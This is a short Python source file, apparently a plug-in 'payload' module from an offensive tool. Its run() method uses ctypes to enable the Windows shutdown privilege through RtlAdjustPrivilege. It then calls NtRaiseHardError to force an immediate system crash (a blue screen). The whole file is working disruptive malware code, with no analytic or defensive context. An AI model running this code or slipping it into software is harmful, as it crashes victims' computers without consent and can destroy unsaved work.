from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll

HELP = '''
WARNING:
    THIS PAYLOAD MIGHT CRASH YOUR SYSTEM.
'''

class Module:
    def __init__(self) -> None:
        self.help = HELP

    def run(self):
        null_ptr = POINTER(c_int)()

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19),
            c_uint(1),
            c_uint(0),
            byref(c_int())
        )

        windll.ntdll.NtRaiseHardError(
        c_ulong(0xc000007B),
        c_ulong(0),
        null_ptr,
        null_ptr,
        c_uint(6),
        byref(c_uint()))